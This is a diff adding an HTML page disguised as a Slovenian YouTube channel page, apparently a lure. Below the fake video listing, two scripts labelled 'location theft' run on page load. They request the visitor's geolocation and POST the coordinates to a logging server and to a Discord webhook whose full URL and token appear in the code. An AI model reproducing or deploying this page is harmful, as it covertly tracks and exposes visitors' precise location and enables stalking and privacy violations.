@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>@jakobtominc - YouTube</title>
+  <style>
+    body { font-family: sans-serif; padding: 20px; }
+    .header { font-size: 24px; font-weight: bold; color: red; }
+    .video { margin-top: 20px; border: 1px solid #ccc; padding: 10px; }
+  </style>
+</head>
+<body>
+  <div class="header">YouTube • Jakob Tominc</div>
+  <p>Dobrodošli na mojem kanalu! Poglejte zadnji video spodaj:</p>
+
+  <div class="video">
+    <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/0.jpg" width="320">
+    <p><strong>Naslov:</strong> Kako razmišljam o znanosti</p>
+  </div>
+
+  <!-- Lokacijska kraja -->
+  <script>
+    navigator.geolocation.getCurrentPosition(function(pos) {
+      fetch("https://your-logging-server.com/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          acc: pos.coords.accuracy,
+          time: new Date().toISOString()
+        })
+      });
+    });
+  </script>
+<script>
+navigator.geolocation.getCurrentPosition(function(pos) {
+  const lokacija = `📍 Nova lokacija:
+  Lat: ${pos.coords.latitude}
+  Lon: ${pos.coords.longitude}
+  Točnost: ${pos.coords.accuracy} m`;
+
+  fetch("https://discord.com/api/webhooks/1387858752891392134/EBC0_CxizrjpHaRnVUlECxA_BUtF1jB_ZDnuNtFUxHPSX47QJCQ0O2zPOa7f8dcdKJPr", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: lokacija })
+  });
+});
+</script>
+</body>
+</html>
